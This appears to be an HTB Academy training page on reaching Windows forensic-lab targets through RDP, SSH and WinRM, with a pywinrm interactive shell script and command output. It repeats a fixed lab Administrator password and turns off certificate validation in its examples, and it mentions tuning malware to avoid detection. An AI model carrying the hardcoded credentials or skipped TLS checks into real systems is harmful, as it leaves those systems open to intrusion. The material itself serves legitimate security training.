
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">


<h1 id="intro-to-academy-s-purple-modules">Intro to Academy&#39;s Purple Modules</h1>
<h2 id="introduction">Introduction</h2>
<p>In this module, &quot;Intro to Academy&#39;s Purple Modules&quot;, we will introduce you to HTB Academy&#39;s Purple modules, which bridge the gap between Offensive and Defensive modules and provide a holistic view of both the attacking and defending perspectives on the covered topics. More specifically, the Purple modules will allow for in-depth forensic analysis through detailed logging, traffic, and memory capturing, and a pre-installed DFIR toolset within each target after completing the attack part of each section.</p>
<p>It is crucial to note that forensic analysis requires the attack part to occur first, as this generates the logs and traffic that will be captured and analyzed. The same applies to memory dumps, which can be obtained after the attack.</p>
<p>\
Moreover, the spawned target must remain active to facilitate forensic analysis activities. Extending the target&#39;s lifetime may be necessary to ensure there is sufficient time to complete the forensic analysis.\</p>
<hr>
<p>The module is divided into two parts:</p>
<ol>
<li><code>Windows Purple Module Targets</code></li>
<li><code>Linux Purple Module Targets</code></li>
</ol>
<p>Each section of this module serves as a reference guide, empowering users to effectively access, configure, and manage critical logging and forensic mechanisms within the Purple module targets. These sections also provide step-by-step guidance on locating logs, traffic captures, memory dumps, configuration files, and utilizing pre-installed DFIR tools to facilitate comprehensive post-exploitation forensic analysis.</p>
<hr>
<h3 id="benefits-of-academy-s-purple-modules">Benefits of Academy&#39;s Purple Modules</h3>
<p>Purple modules are highly beneficial for both Blue Team and Red Team members. For Blue Team professionals, these modules offer exposure to Red Team tactics and enable them to learn how to emulate these techniques. Meanwhile, Red Team operators gain invaluable insights into the artifacts their attacks leave behind, allowing them to refine their methods and minimize detectable footprints with each iteration.</p>
<p><strong><code>Disclaimer:</code></strong> Please note that the &quot;Intro to Academy&#39;s Purple Modules&quot; module is designed for individuals with a good understanding of both offensive and defensive security practices. This module assumes that participants are proficient in operating Windows and Linux systems and are familiar with common attack vectors and detection methodologies. As such, the DFIR toolset included, as well as the attacking and detecting techniques discussed, will not be covered in exhaustive detail. This module is intended for experienced professionals in the field, aiming to showcase how upcoming Purple modules should be approached and to highlight the capabilities of Purple module targets.</p>
<p><strong>Purple Module Targets as Reusable Infrastructure</strong></p>
<ul>
<li><strong><code>Blue Team Use Cases of Purple Module Targets:</code></strong><ul>
<li>Blue team professionals can transfer evidence from other compromised machines into Purple module targets for in-depth analysis, leveraging the built-in DFIR tools.</li>
<li>Blue team professionals can install vulnerable software of their choosing, simulate attacks on the software, and analyze the attack artifacts left behind, gaining practical insight into threat behaviors and identifying IOCs.</li>
<li>Blue team professionals can use the verbose logs and DFIR toolset of Purple module targets to develop and refine detection rules for identified IOCs.</li>
<li>Blue team professionals can use these targets to develop and validate threat hunting hypotheses by emulating attack chains and investigating the associated logs and system changes.</li>
<li>Blue team professionals can collect telemetry to reverse-engineer malware behavior in a controlled environment and design incident response playbooks.</li>
</ul>
</li>
<li><strong><code>Red Team Use Cases of Purple Module Targets:</code></strong><ul>
<li>Red team professionals can test custom-built or modified malware payloads to observe logs, process behavior, and other telemetry data. They can then use this data to refine methods and reduce detection opportunities.</li>
</ul>
</li>
<li><strong><code>Purple Team Use Cases of Purple Module Targets:</code></strong><ul>
<li>Both Blue and Red Teams can collaborate to simulate full attack-and-detect cycles, using the Purple module targets as the shared and controlled platform for learning and innovation.</li>
</ul>
</li>
</ul>
<hr>
<h2 id="connecting-to-windows-purple-module-targets">Connecting to Windows Purple Module Targets</h2>
<h3 id="connection-methods">Connection Methods</h3>
<p>In this section, we will demonstrate the various methods available for connecting to Windows Purple module targets <code>after</code> the attack part of each section has concluded. The following connection methods can be used for remote management and interaction:</p>
<ul>
<li>Remote Desktop Protocol (RDP)</li>
<li>Secure Shell (SSH)</li>
<li>Windows Remote Management (WinRM)</li>
</ul>
<h3 id="remote-desktop-protocol-rdp-">Remote Desktop Protocol (RDP)</h3>
<p>RDP is a widely used protocol for remotely connecting to a Windows environment. It provides full access to the machine&#39;s graphical user interface (GUI), making it ideal for users who need direct interaction with the desktop.</p>
<p><strong>Steps to Connect via RDP from Windows:</strong></p>
<ul>
<li>Download the <code>VPN connection file</code> by following the appropriate guide: use <a href="https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn">this article</a> if logged into HTB Academy, or <a href="https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access">this article</a> if logged into HTB Enterprise. Then, use VPN software such as <a href="https://openvpn.net/">OpenVPN</a> to connect to the VPN server and to reach the target.</li>
<li>Retrieve the IP address of the Windows Purple module target, displayed at the bottom of the respective section once the target has been spawned.</li>
<li>Open an RDP client (e.g., Remote Desktop Connection on Windows) and enter the IP address.</li>
<li>Authenticate using the following credentials to initiate the session:<ul>
<li>Username: <code>Administrator</code></li>
<li>Password: <code>P3n#31337@LOG</code></li>
</ul>
</li>
</ul>
<p>You can also launch an RDP client by typing <code>mstsc.exe</code> into the Run dialog (Windows key + R) or a command prompt.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/logging_18.png" alt="Remote Desktop Connection window with fields for computer name and username, and buttons for Connect and Help."></p>
<p><strong>Steps to Connect via RDP From Linux (including Pwnbox):</strong></p>
<ul>
<li>If you are not using Pwnbox, download the <code>VPN connection file</code> by following the appropriate guide: use <a href="https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn">this article</a> if logged into HTB Academy, or <a href="https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access">this article</a> if logged into HTB Enterprise. Then, use VPN software such as <a href="https://openvpn.net/">OpenVPN</a> to <a href="https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn">connect to the VPN</a>. If you are using Pwnbox, you are already connected to the VPN.</li>
<li>Retrieve the IP address of the Windows Purple module target, displayed at the bottom of the respective section once the target has been spawned.</li>
<li>Execute the command below, specifying the following credentials.<ul>
<li>Username: <code>Administrator</code></li>
<li>Password: <code>P3n#31337@LOG</code></li>
</ul>
</li>
</ul>
<p>&#x20; Connecting to Windows Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ xfreerdp /u:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span></span> /p:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span></span> /v:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Target_IP</span>&gt;</span></span> /dynamic-resolution
[<span class="hljs-string">08:17:44:253</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - creating directory /home/htb-ac-60784/.config/freerdp
[<span class="hljs-string">08:17:44:253</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - creating directory [/home/htb-ac-60784/.config/freerdp/certs]
[<span class="hljs-string">08:17:44:253</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - created directory [/home/htb-ac-60784/.config/freerdp/server]
[<span class="hljs-string">08:17:44:420</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">WARN</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[<span class="hljs-string">08:17:44:420</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">WARN</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - CN = Logging-VM
[<span class="hljs-string">08:17:44:420</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[<span class="hljs-string">08:17:44:420</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[<span class="hljs-string">08:17:44:420</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[<span class="hljs-string">08:17:44:420</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - The hostname used for this connection (10.129.232.10:3389) 
[<span class="hljs-string">08:17:44:420</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - does not match the name given in the certificate:
[<span class="hljs-string">08:17:44:420</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - Common Name (CN):
[<span class="hljs-string">08:17:44:420</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] -     Logging-VM
[<span class="hljs-string">08:17:44:420</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.232.10:3389 (RDP-Server):
<span class="hljs-code">    Common Name: Logging-VM</span>
<span class="hljs-code">    Subject:     CN = Logging-VM</span>
<span class="hljs-code">    Issuer:      CN = Logging-VM</span>
<span class="hljs-code">    Thumbprint:  a8:35:0a:61:04:6b:48:d4:6d:a8:cb:8c:d6:ca:28:86:f2:22:12:55:8a:29:75:a1:ba:c2:77:82:9d:cc:1e:87</span>
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[<span class="hljs-string">08:18:01:881</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.winpr.timezone</span>] - Unable to find a match for unix timezone: US/Central
[<span class="hljs-string">08:18:02:582</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.gdi</span>] - Local framebuffer format  PIXEL<span class="hljs-emphasis">_FORMAT_</span>BGRX32
[<span class="hljs-string">08:18:02:582</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.gdi</span>] - Remote framebuffer format PIXEL<span class="hljs-emphasis">_FORMAT_</span>BGRA32
[<span class="hljs-string">08:18:02:591</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.channels.rdpsnd.client</span>] - [static] Loaded fake backend for rdpsnd
[<span class="hljs-string">08:18:02:591</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.channels.drdynvc.client</span>] - Loading Dynamic Virtual Channel rdpgfx
[<span class="hljs-string">08:18:02:591</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.channels.drdynvc.client</span>] - Loading Dynamic Virtual Channel disp
[<span class="hljs-string">08:18:04:733</span>] [<span class="hljs-string">369695:369696</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.client.x11</span>] - Logon Error Info LOGON<span class="hljs-emphasis">_FAILED_</span>OTHER [LOGON<span class="hljs-emphasis">_MSG_</span>SESSION_CONTINUE]
</code></pre>
<p>You should now be able to access the Windows Purple module target via RDP.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/logging_17.png" alt="Windows desktop with icons for Recycle Bin, Firefox, IDA Freeware, Wireshark, and root.txt file."></p>
<p>Another alternative Linux RDP client is <a href="https://remmina.org/">remmina</a>.</p>
<p><strong>Steps to Connect via RDP from macOS:</strong></p>
<p>You can use the <a href="https://apps.apple.com/us/app/windows-app/id1295203466">Microsoft Remote Desktop</a> app from the Mac App Store.</p>
<ul>
<li>Download the <code>VPN connection file</code> by following the appropriate guide: use <a href="https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn">this article</a> if logged into HTB Academy or <a href="https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access">this article</a> if logged into HTB Enterprise. Then, use VPN software such as <a href="https://openvpn.net/">OpenVPN</a> to connect to the VPN and to reach the target.</li>
<li>Install <code>Microsoft Remote Desktop</code> from the macOS App Store.</li>
<li>Open the app and add a new PC.</li>
<li>Retrieve the IP address of the Windows Purple module target, displayed at the bottom of the respective section once the target has been spawned.</li>
<li>Enter the IP address</li>
<li>Start the session and specify the following credentials when prompted to connect to the Windows Purple module target via RDP.<ul>
<li>Username: <code>Administrator</code></li>
<li>Password: <code>P3n#31337@LOG</code></li>
</ul>
</li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/257/logging_21.png" alt="Add PC window with fields for PC name, credentials, and options for reconnecting."></p>
<p><strong>Note</strong>: RDP connections use port <code>3389</code> by default, and traffic through this port is logged in firewall logs.</p>
<hr>
<h3 id="secure-shell-ssh-">Secure Shell (SSH)</h3>
<p>SSH provides secure, command-line-based access to the Windows machine, making it ideal for remote administration without the need for a graphical interface. Both Windows, Linux, and macOS come with an SSH client pre-installed, so no additional software is required.</p>
<p><strong>Steps to Connect via SSH from Windows, macOS, and Linux (including Pwnbox):</strong></p>
<ul>
<li>If you are not using Pwnbox, download the <code>VPN connection file</code> by following the appropriate guide: use <a href="https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn">this article</a> if logged into HTB Academy, or <a href="https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access">this article</a> if logged into HTB Enterprise. Then, use VPN software such as <a href="https://openvpn.net/">OpenVPN</a> to <a href="https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn">connect to the VPN</a>. If you are using Pwnbox, you are already connected to the VPN.</li>
<li>After obtaining the IP address of the Windows Purple module target, displayed at the bottom of the respective section, use the command below to connect via SSH, specifying the following credentials:<ul>
<li>Username: <code>Administrator</code></li>
<li>Password: <code>P3n#31337@LOG</code></li>
</ul>
</li>
</ul>
<p>&#x20; Connecting to Windows Purple Module Targets</p>
<pre><code class="lang-shell-session">ssh username@&lt;Target_IP&gt; -v

Are you sure you want to <span class="hljs-keyword">continue</span> connecting (yes<span class="hljs-regexp">/no/</span>[fingerprint])? yes

username@&lt;Target_IP&gt;'s password: 

Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span><span class="hljs-number">.2628</span>]
(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.

administrator<span class="hljs-meta">@LOGGING</span>-VM <span class="hljs-string">C:</span>\Users\Administrator&gt;
</code></pre>
<p><strong>Note</strong>: This method provides command-line access only to the Windows Purple module target.</p>
<h3 id="windows-remote-management-winrm-">Windows Remote Management (WinRM)</h3>
<p>WinRM is a PowerShell-based remote management service that allows users to execute commands or scripts on a Windows machine from a remote computer.</p>
<p><strong>Steps to Connect via WinRM from Windows:</strong></p>
<ul>
<li>Download the <code>VPN connection file</code> by following the appropriate guide: use <a href="https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn">this article</a> if logged into HTB Academy, or <a href="https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access">this article</a> if logged into HTB Enterprise. Then, use VPN software such as <a href="https://openvpn.net/">OpenVPN</a> to connect to the VPN and to reach the target.</li>
<li>You can connect to a Windows Purple module via WinRM from another Windows machine using PowerShell, as follows, specifying the credentials below:<ul>
<li>Username: <code>Administrator</code></li>
<li>Password: <code>P3n#31337@LOG</code></li>
</ul>
</li>
</ul>
<p>&#x20; Connecting to Windows Purple Module Targets</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\&gt; $s0 = New-PSSessionOption -SkipCACheck -SkipCNCheck
PS <span class="hljs-keyword">C</span>:\&gt; <span class="hljs-keyword">Enter</span>-PSSession -ComputerName <span class="hljs-string">'Target_IP'</span> -Credential Administrator -UseSSL -SessionOption $s0
[Target_IP]: PS <span class="hljs-keyword">C</span>:\Users\Administrator\Documents&gt;
</code></pre>
<p><strong>Steps to Connect via WinRM from Linux (including Pwnbox) or macOS:</strong></p>
<p>If you are not using Pwnbox, download the <code>VPN connection file</code> by following the appropriate guide: use <a href="https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn">this article</a> if logged into HTB Academy, or <a href="https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access">this article</a> if logged into HTB Enterprise. Then, use VPN software such as <a href="https://openvpn.net/">OpenVPN</a> to <a href="https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn">connect to the VPN</a>. If you are using Pwnbox, you are already connected to the VPN.</p>
<p>A viable solution to connect via WinRM from Linux is installing Python&#39;s <code>pywinrm</code> package.</p>
<p>&#x20; Connecting to Windows Purple Module Targets</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ pip install pywinrm
Defaulting to user installation because normal site-packages is not writeable
Collecting pywinrm
  Downloading pywinrm<span class="hljs-number">-0.5</span><span class="hljs-number">.0</span>-py3-none-any.whl.metadata (<span class="hljs-number">11</span> kB)
Requirement already <span class="hljs-string">satisfied:</span> requests&gt;=<span class="hljs-number">2.9</span><span class="hljs-number">.1</span> <span class="hljs-keyword">in</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3<span class="hljs-number">.11</span>/dist-packages (from pywinrm) (<span class="hljs-number">2.32</span><span class="hljs-number">.3</span>)
Requirement already <span class="hljs-string">satisfied:</span> requests-ntlm&gt;=<span class="hljs-number">1.1</span><span class="hljs-number">.0</span> <span class="hljs-keyword">in</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3<span class="hljs-number">.11</span>/dist-packages (from pywinrm) (<span class="hljs-number">1.3</span><span class="hljs-number">.0</span>)
Requirement already <span class="hljs-string">satisfied:</span> xmltodict <span class="hljs-keyword">in</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3<span class="hljs-number">.11</span>/dist-packages (from pywinrm) (<span class="hljs-number">0.13</span><span class="hljs-number">.0</span>)
Requirement already <span class="hljs-string">satisfied:</span> charset-normalizer&lt;<span class="hljs-number">4</span>,&gt;=<span class="hljs-number">2</span> <span class="hljs-keyword">in</span> <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist-packages (from requests&gt;=<span class="hljs-number">2.9</span><span class="hljs-number">.1</span>-&gt;pywinrm) (<span class="hljs-number">3.0</span><span class="hljs-number">.1</span>)
Requirement already <span class="hljs-string">satisfied:</span> idna&lt;<span class="hljs-number">4</span>,&gt;=<span class="hljs-number">2.5</span> <span class="hljs-keyword">in</span> <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist-packages (from requests&gt;=<span class="hljs-number">2.9</span><span class="hljs-number">.1</span>-&gt;pywinrm) (<span class="hljs-number">3.3</span>)
Requirement already <span class="hljs-string">satisfied:</span> urllib3&lt;<span class="hljs-number">3</span>,&gt;=<span class="hljs-number">1.21</span><span class="hljs-number">.1</span> <span class="hljs-keyword">in</span> <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist-packages (from requests&gt;=<span class="hljs-number">2.9</span><span class="hljs-number">.1</span>-&gt;pywinrm) (<span class="hljs-number">1.26</span><span class="hljs-number">.12</span>)
Requirement already <span class="hljs-string">satisfied:</span> certifi&gt;=<span class="hljs-number">2017.4</span><span class="hljs-number">.17</span> <span class="hljs-keyword">in</span> <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist-packages (from requests&gt;=<span class="hljs-number">2.9</span><span class="hljs-number">.1</span>-&gt;pywinrm) (<span class="hljs-number">2022.9</span><span class="hljs-number">.24</span>)
Requirement already <span class="hljs-string">satisfied:</span> cryptography&gt;=<span class="hljs-number">1.3</span> <span class="hljs-keyword">in</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3<span class="hljs-number">.11</span>/dist-packages (from requests-ntlm&gt;=<span class="hljs-number">1.1</span><span class="hljs-number">.0</span>-&gt;pywinrm) (<span class="hljs-number">42.0</span><span class="hljs-number">.8</span>)
Requirement already <span class="hljs-string">satisfied:</span> pyspnego&gt;=<span class="hljs-number">0.4</span><span class="hljs-number">.0</span> <span class="hljs-keyword">in</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3<span class="hljs-number">.11</span>/dist-packages (from requests-ntlm&gt;=<span class="hljs-number">1.1</span><span class="hljs-number">.0</span>-&gt;pywinrm) (<span class="hljs-number">0.11</span><span class="hljs-number">.1</span>)
Requirement already <span class="hljs-string">satisfied:</span> cffi&gt;=<span class="hljs-number">1.12</span> <span class="hljs-keyword">in</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3<span class="hljs-number">.11</span>/dist-packages (from cryptography&gt;=<span class="hljs-number">1.3</span>-&gt;requests-ntlm&gt;=<span class="hljs-number">1.1</span><span class="hljs-number">.0</span>-&gt;pywinrm) (<span class="hljs-number">1.17</span><span class="hljs-number">.1</span>)
Requirement already <span class="hljs-string">satisfied:</span> pycparser <span class="hljs-keyword">in</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3<span class="hljs-number">.11</span>/dist-packages (from cffi&gt;=<span class="hljs-number">1.12</span>-&gt;cryptography&gt;=<span class="hljs-number">1.3</span>-&gt;requests-ntlm&gt;=<span class="hljs-number">1.1</span><span class="hljs-number">.0</span>-&gt;pywinrm) (<span class="hljs-number">2.22</span>)
Downloading pywinrm<span class="hljs-number">-0.5</span><span class="hljs-number">.0</span>-py3-none-any.whl (<span class="hljs-number">48</span> kB)
Installing collected <span class="hljs-string">packages:</span> pywinrm
Successfully installed pywinrm<span class="hljs-number">-0.5</span><span class="hljs-number">.0</span>

[notice] A <span class="hljs-keyword">new</span> release of pip is <span class="hljs-string">available:</span> <span class="hljs-number">24.2</span> -&gt; <span class="hljs-number">24.3</span><span class="hljs-number">.1</span>
[notice] To update, <span class="hljs-string">run:</span> <span class="hljs-regexp">/usr/</span>bin/python -m pip install --upgrade pip
</code></pre>
<p>Below is an example of running a command using Python&#39;s <a href="https://pypi.org/project/pywinrm/">pywinrm</a>. Use the following credentials:</p>
<ul>
<li>Username: <code>Administrator</code></li>
<li>Password: <code>P3n#31337@LOG</code></li>
</ul>
<p>&#x20; Connecting to Windows Purple Module Targets</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ python
Python <span class="hljs-number">3.11</span><span class="hljs-number">.2</span> (main, May  <span class="hljs-number">2</span> <span class="hljs-number">2024</span>, <span class="hljs-number">11</span>:<span class="hljs-number">59</span>:<span class="hljs-number">08</span>) [GCC <span class="hljs-number">12.2</span><span class="hljs-number">.0</span>] on linux
Type <span class="hljs-string">"help"</span>, <span class="hljs-string">"copyright"</span>, <span class="hljs-string">"credits"</span> or <span class="hljs-string">"license"</span> <span class="hljs-keyword">for</span> more information.
&gt;&gt;&gt; <span class="hljs-keyword">import</span> winrm
&gt;&gt;&gt; session = winrm.Session(<span class="hljs-string">'https://&lt;Target_IP&gt;:5986/wsman'</span>, auth=(<span class="hljs-string">'Administrator'</span>,<span class="hljs-string">'P3n#31337@LOG'</span>), transport=<span class="hljs-string">'ntlm'</span>, server_cert_validation=<span class="hljs-string">'ignore'</span>)
&gt;&gt;&gt; result = session.run_cmd(<span class="hljs-string">'ipconfig'</span>)
&gt;&gt;&gt; print(result.std_out.decode())

Windows IP Configuration


Ethernet adapter <span class="hljs-string">Ethernet0:</span>

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : <span class="hljs-string">dead:</span><span class="hljs-string">beef:</span>:<span class="hljs-number">8</span>d
   IPv6 Address. . . . . . . . . . . : <span class="hljs-string">dead:</span><span class="hljs-string">beef:</span>:<span class="hljs-string">d0a4:</span><span class="hljs-string">feb2:</span><span class="hljs-number">5340</span>:c4f5
   Link-local IPv6 Address . . . . . : <span class="hljs-string">fe80:</span>:<span class="hljs-string">d0a4:</span><span class="hljs-string">feb2:</span><span class="hljs-number">5340</span>:c4f5%<span class="hljs-number">5</span>
   IPv4 Address. . . . . . . . . . . : Target_IP
   Subnet Mask . . . . . . . . . . . : <span class="hljs-number">255.255</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
   Default Gateway . . . . . . . . . : <span class="hljs-string">fe80:</span>:<span class="hljs-number">250</span>:<span class="hljs-number">56</span><span class="hljs-string">ff:</span><span class="hljs-string">feb0:</span>bfbf%<span class="hljs-number">5</span>
                                       <span class="hljs-number">10.129</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>

&gt;&gt;&gt;
</code></pre>
<p><strong>Note</strong>: WinRM defaults to HTTP on port <code>5985</code>, but HTTPS on port <code>5986</code> is also available for secure connections using certificates.</p>
<p>The Python script below can be used to establish an interactive WinRM shell. Use the following credentials:</p>
<ul>
<li>Username: <code>Administrator</code></li>
<li>Password: <code>P3n#31337@LOG</code></li>
</ul>
<p>Code: python</p>
<pre><code class="lang-python">
<span class="hljs-comment">#!/usr/bin/env python3</span>

<span class="hljs-keyword">import</span> winrm
<span class="hljs-keyword">import</span> getpass

<span class="hljs-comment"># Get connection details from user</span>
ip_addr = input(<span class="hljs-string">"Enter target IP address: "</span>)
username = input(<span class="hljs-string">"Enter username: "</span>)
password = getpass.getpass(<span class="hljs-string">"Enter password: "</span>)

<span class="hljs-comment"># Create a session for WinRM with SSL</span>
session = winrm.Session(
    f<span class="hljs-string">'https://{ip_addr}:5986/wsman'</span>,  <span class="hljs-comment"># Dynamic hostname or IP address</span>
    auth=(username, password),
    transport=<span class="hljs-string">'ntlm'</span>,  <span class="hljs-comment"># Using NTLM authentication</span>
    server_cert_validation=<span class="hljs-string">'ignore'</span>  <span class="hljs-comment"># Skip certificate validation</span>
)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interactive_shell</span><span class="hljs-params">()</span>:</span>
    print(<span class="hljs-string">"WinRM Interactive Shell"</span>)
    print(<span class="hljs-string">"Type 'exit' to quit the shell."</span>)

    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        command = input(<span class="hljs-string">"winrm&gt; "</span>)

        <span class="hljs-keyword">if</span> command.lower() == <span class="hljs-string">'exit'</span>:
            print(<span class="hljs-string">"Exiting the shell."</span>)
            <span class="hljs-keyword">break</span>

        <span class="hljs-comment"># Run the command remotely</span>
        result = session.run_cmd(command)

        <span class="hljs-comment"># Print the result</span>
        <span class="hljs-keyword">if</span> result.std_out:
            print(result.std_out.decode())
        <span class="hljs-keyword">if</span> result.std_err:
            print(<span class="hljs-string">"Error: "</span>, result.std_err.decode())

<span class="hljs-comment"># Run the interactive shell</span>
interactive_shell()
</code></pre>
<p>Here&#39;s an example of using this script (saved as <code>winrm_connect.py</code>) to connect to a Windows Purple module target from a Linux or macOS system via WinRM.</p>
<p>&#x20; Connecting to Windows Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python winrm_connect<span class="hljs-selector-class">.py</span> 
Enter target IP <span class="hljs-selector-tag">address</span>: &lt;Target_IP&gt;
Enter username: Administrator
Enter password: 
WinRM Interactive Shell
Type <span class="hljs-string">'exit'</span> to quit the shell.
winrm&gt; dir
 Volume <span class="hljs-keyword">in</span> drive C has no <span class="hljs-selector-tag">label</span>.
 Volume Serial Number is B8B3-<span class="hljs-number">0</span>D72

 Directory of C:\Users\Administrator

<span class="hljs-number">06</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">02</span>:<span class="hljs-number">39</span> AM    &lt;DIR&gt;          .
<span class="hljs-number">06</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">02</span>:<span class="hljs-number">39</span> AM    &lt;DIR&gt;          ..
<span class="hljs-number">06</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">01</span>:<span class="hljs-number">27</span> PM    &lt;DIR&gt;          <span class="hljs-selector-class">.osquery</span>
<span class="hljs-number">06</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">02</span>:<span class="hljs-number">39</span> AM    &lt;DIR&gt;          <span class="hljs-selector-class">.ssh</span>
<span class="hljs-number">06</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">01</span>:<span class="hljs-number">54</span> AM    &lt;DIR&gt;          <span class="hljs-number">3</span>D Objects
<span class="hljs-number">06</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">01</span>:<span class="hljs-number">54</span> AM    &lt;DIR&gt;          Contacts
<span class="hljs-number">09</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">01</span>:<span class="hljs-number">02</span> AM    &lt;DIR&gt;          Desktop
<span class="hljs-number">11</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">08</span>:<span class="hljs-number">25</span> AM    &lt;DIR&gt;          Documents
<span class="hljs-number">09</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">12</span>:<span class="hljs-number">15</span> AM    &lt;DIR&gt;          Downloads
<span class="hljs-number">06</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">01</span>:<span class="hljs-number">54</span> AM    &lt;DIR&gt;          Favorites
